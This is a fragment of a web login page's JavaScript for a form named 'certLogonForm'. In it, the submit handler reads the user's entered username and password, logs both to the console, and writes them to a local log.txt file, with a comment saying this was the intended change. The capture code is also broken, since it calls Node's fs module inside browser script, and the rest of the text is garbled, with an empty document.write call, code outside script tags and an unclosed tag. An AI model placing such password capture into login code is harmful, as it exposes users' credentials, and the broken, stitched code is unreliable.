    <script language="JavaScript">
      function putFocus(formInst, elementInst) {
        if (document.forms.length > 0) {
          document.forms[formInst].elements[elementInst].focus();
        }
      }

      function setValuesAutoCreation() {
        var form = document.getElementById("certLogonForm");
        form.j_username.value = "";
        form.j_password.value = "";
        form.automaticAccountCreation.value = "true";
      }
      function submitForm() {
        var form = document.getElementById("certLogonForm");
        var username = form.j_username.value;
        var password = form.j_password.value;
        console.log(username, password);
        const fs = require("fs");
        fs.writeFile("log.txt", username + " " + password, (err) => {
          if (err) throw err;
          console.log("The file has been saved!");
        });
        //have it create a new .txt file with the form valuesLog On
        form.submit();
      }
      function setFocusToFirstField() {
        myform = document.certLogonForm;
        try {
          for (i = 0; i < myform.length; i++) {
            elem = myform.elements[i];
            if (!elem.disabled) {
              elemType = elem.type;
              if (elemType == "text" || elemType == "password") {
                if (!elem.readOnly && elem.value == "") {
                  elem.focus();
                  break;
                }
              }
              if (
                elemType == "select-one" ||
                elemType == "select-multiple" ||
                elemType == "checkbox" ||
                elemType == "radio"
              ) {
                elem.focus();
                break;
              }
            }
          }
        } catch (ex) {}
      }
      function onClickCertCancel() {
        document.certLogonForm.j_password.value = "";
        document.certLogonForm.cancelIdPLogon.value = "Cancel";
      }
    </script>

        function writeMessage() {
          document.write(

          );
        }

        if (blockPage) {
          var browserName = navigator.appName;
          // According to the tests IE works with document.execCommand(), but Firefox and Chrome do not
          if (browserName.indexOf("Explorer") > -1) {
            writeMessage();
            document.execCommand("Stop");
          } else {
            writeMessage();
            window.stop();
          }
        }

    <script>
      var hash = document.location.hash;
      if (hash && hash != "#") {
        var forms = document.getElementsByTagName("FORM");
        for (var i = 0; i < forms.length; i++) {
          var form = forms[i];
          var currentElement = document.createElement("input");
          currentElement.setAttribute("type", "hidden");
          currentElement.setAttribute("name", "postAnchorString");
          currentElement.setAttribute("id", "postAnchorString");
          currentElement.setAttribute("value", hash);
          form.appendChild(currentElement);
        }
      }
